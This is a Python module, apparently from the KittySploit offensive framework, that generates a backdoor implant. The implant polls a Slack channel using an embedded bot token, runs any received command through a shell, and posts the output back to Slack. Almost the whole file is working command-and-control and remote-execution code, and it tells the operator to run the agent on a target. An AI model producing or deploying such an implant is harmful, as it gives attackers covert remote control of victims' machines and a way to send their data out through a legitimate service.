from kittysploit import *


class Module(Backdoor):
	"""Slack Web API polling implant — not an exploit payload (needs bot token)."""

	__info__ = {
		"name": "Slack Socket Mode / Web API Polling Agent",
		"description": (
			"Writes a Python implant that polls a Slack channel for commands and posts "
			"results. Controller: listeners/messaging/slack_socketmode. "
			"Requires a Slack bot token on the implant — install as backdoor, not exploit payload."
		),
		"author": "KittySploit Team",
		"platform": Platform.MULTI,
		"arch": Arch.PYTHON,
		"session_type": SessionType.POLLING,
		"listener": "listeners/messaging/slack_socketmode",
	}

	bot_token = OptString("", "Slack bot token (xoxb-...) embedded in implant", True)
	channel_id = OptString("", "Channel ID to poll", True)
	client_id = OptString("slack-agent", "Client ID (must match listener)", False)
	command_prefix = OptString("!ks", "Message prefix (must match listener)", False)
	poll_interval = OptInteger(5, "Poll interval seconds", False)
	filename = OptString("", "Output filename (empty = random .py)", False)

	def check(self):
		return bool(str(self.bot_token or "").strip() and str(self.channel_id or "").strip())

	def run(self):
		if not self.check():
			print_error("bot_token and channel_id are required")
			return False

		token = str(self.bot_token).strip()
		channel = str(self.channel_id).strip()
		cid = str(self.client_id or "slack-agent").strip() or "slack-agent"
		prefix = str(self.command_prefix or "!ks").strip() or "!ks"
		interval = max(2, int(self.poll_interval or 5))

		# Agent uses Web API history polling (stdlib). Listener posts:
		#   !ks cmd <client_id> <command>
		# Agent replies:
		#   !ks <client_id> <output>
		script = f'''#!/usr/bin/env python3
import json,os,subprocess,time,urllib.parse,urllib.request
TOKEN={token!r}; CHANNEL={channel!r}; CID={cid!r}; PREFIX={prefix!r}; INTERVAL={interval}
API="https://slack.com/api/"
_seen=set()
_latest=None

def api(method, data=None):
  body=None; headers={{"Authorization":"Bearer "+TOKEN,"Content-Type":"application/x-www-form-urlencoded"}}
  if data is not None:
    body=urllib.parse.urlencode(data).encode()
  req=urllib.request.Request(API+method, data=body, headers=headers)
  with urllib.request.urlopen(req, timeout=30) as resp:
    return json.loads(resp.read().decode("utf-8","replace"))

def post(text):
  api("chat.postMessage", {{"channel":CHANNEL,"text":text}})

def run_cmd(cmd):
  try:
    p=subprocess.run(cmd,shell=True,capture_output=True,timeout=120)
    out=(p.stdout or b"")+(p.stderr or b"")
    if not out: out=("exit %s\\n"%p.returncode).encode()
    return out.decode("utf-8","replace")
  except Exception as e:
    return "ERROR:%s"%e

# announce
try: post(PREFIX+" "+CID+" ready")
except Exception: pass

while True:
  try:
    params={{"channel":CHANNEL,"limit":"20"}}
    if _latest: params["oldest"]=str(_latest)
    data=api("conversations.history", params)
    if not data.get("ok"):
      time.sleep(INTERVAL); continue
    msgs=list(reversed(data.get("messages") or []))
    for m in msgs:
      ts=str(m.get("ts") or "")
      if ts: _latest=max(float(_latest or 0), float(ts))
      mid=m.get("client_msg_id") or ts
      if mid in _seen: continue
      _seen.add(mid)
      text=(m.get("text") or "").strip()
      # Listener format: !ks cmd <client_id> <command>
      parts=text.split(None, 3)
      if len(parts)<4: continue
      if parts[0]!=PREFIX or parts[1]!="cmd" or parts[2]!=CID: continue
      cmd=parts[3]
      out=run_cmd(cmd)
      # truncate to stay under Slack limits; keep newlines (listener uses split max 2)
      if len(out)>3500: out=out[:3500]+"...[truncated]"
      post(PREFIX+" "+CID+" "+out)
  except Exception:
    pass
  time.sleep(INTERVAL)
'''

		name = str(self.filename or "").strip() or (self.random_text(8) + "_slack_agent.py")
		if not name.endswith(".py"):
			name += ".py"
		if not self.write_out_dir(name, script):
			print_error("Failed to write agent file")
			return False
		print_success(f"Generated: {name}")
		print_info(f"client_id={cid}  prefix={prefix}  channel={channel}")
		print_info("Start listeners/messaging/slack_socketmode with matching options, then run the agent on target")
		print_warning("Backdoor implant (tokens embedded) — not for exploit payload chaining")
		return True
